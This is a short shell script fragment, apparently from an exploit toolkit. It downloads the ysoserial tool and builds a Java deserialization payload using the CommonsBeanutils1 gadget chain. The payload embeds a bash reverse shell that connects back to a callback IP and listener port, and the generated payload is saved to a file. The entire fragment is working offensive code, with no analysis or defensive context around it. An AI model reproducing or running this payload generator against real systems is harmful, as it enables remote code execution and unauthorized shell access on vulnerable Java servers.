echo "[+] Generating ysoserial payload with reverse shell..."
if [ ! -f ysoserial.jar ]; then
  curl -L -o ysoserial.jar https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar
fi

CMD="bash -c 'bash -i >& /dev/tcp/$CALLBACK_IP/$LISTENER_PORT 0>&1'"
java --add-opens java.base/java.util=ALL-UNNAMED \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  -jar ysoserial.jar CommonsBeanutils1 "$CMD" > "$PAYLOAD_FILE"